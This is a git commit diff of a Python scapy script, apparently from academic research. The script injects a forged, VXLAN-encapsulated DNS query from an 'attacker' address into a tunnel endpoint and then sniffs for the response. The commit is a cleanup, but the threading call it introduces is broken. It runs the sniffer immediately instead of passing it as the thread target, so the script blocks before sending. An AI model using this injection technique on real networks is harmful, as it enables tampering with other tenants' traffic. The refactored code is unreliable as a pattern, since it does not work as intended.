6614b4799475fb611d92b8f06dab865d71071476
Benjamin Fuhlbrügge <s176110@hft-leipzig.de>
2020-08-21 21:07:36 +0200

    aufräumen

--- dns.py
+++ dns.py
@@ -24,32 +24,15 @@ lookup = sys.argv[1]
 
 
 
-class myThread (threading.Thread):
-   def __init__(self, testport1):
-      threading.Thread.__init__(self)
-      self.testport = testport1
-   def run(self):
-      sniff_dns_thread()
-
-
-def custom_action(packet):
-    global thepacket
-    thepacket = str(packet)
-    return
-
 #GET Response Function
-def sniff_dns_thread():
+def sniff_dns_thread(testport):
     sniff(filter = "udp and port " + str(testport), count = 1, prn= lambda x:x.summary())
     return
 
-#start sniff thread
-# Create new threads
-thread1 = myThread(testport)
-
-# Start new Threads
-thread1.start()
-
-time.sleep(1)
+#start sniff thread and sleep shortly for the thread to come up
+sniffer_thread = threading.Thread(target=sniff_dns_thread(testport))
+sniffer_thread.start()
+time.sleep(0.5)
 
 # sned dns request
 send(IP(src=attacker,dst=vtep)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1),flags="Instance")/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=testport,dport=53)/DNS(rd=1,qd=DNSQR(qname=str(lookup),qtype="A")))
